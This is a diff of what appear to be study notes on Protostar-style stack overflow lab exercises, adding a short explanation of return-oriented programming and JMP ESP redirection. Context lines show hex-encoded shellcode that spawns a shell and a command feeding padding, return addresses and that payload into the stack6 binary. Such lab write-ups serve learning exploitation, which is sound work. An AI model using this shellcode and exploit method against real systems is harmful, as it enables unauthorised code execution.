@@ -17,7 +17,7 @@
   - [stack5: jmp esp](#stack5-jmp-esp)
     - [stack5 solution](#stack5-solution)
   - [stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)](#stack6-compile-time-return-address-check-forbid-returning-to-stack-rop-gadget-return-to-text-section)
-    - [stack6 solution](#stack6-solution)
+    - [stack6: Return Oriented Programming](#stack6-return-oriented-programming)
   - [stack7: ret2libc](#stack7-ret2libc)
     - [ret2Libc](#ret2libc)
     - [ret2Libc Summary](#ret2libc-summary)
@@ -266,7 +266,13 @@ payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3
 ./stack6 <<< $(echo -en $padding; echo -en $ret0; echo -en $ret1; echo $payload)
 ```
 
-### stack6 solution
+### stack6: Return Oriented Programming
+
+- Summary:
+  + Generally, find a *gadget*, return to it, and use its side effect.
+  + e.g. redirecting(return) to the "ret" opcode of the original function, whose address is static in the original `.text` section (assume no ASLR), will pop the `esp` to `eip`. Similar to a `pop EIP`.
+  + (? however, a clean-up may happens, which may clean up the args. In a `__stdcall`, callee cleans up the stack; In a `__cdecl` (C && C++ default), caller cleans up the stack.)
+  + Redirecting the return to an static `JMP ESP` (a loaded library without ASLR enabled) opcode does the same.
 
 ```bash
   # Simulate no ASLR.
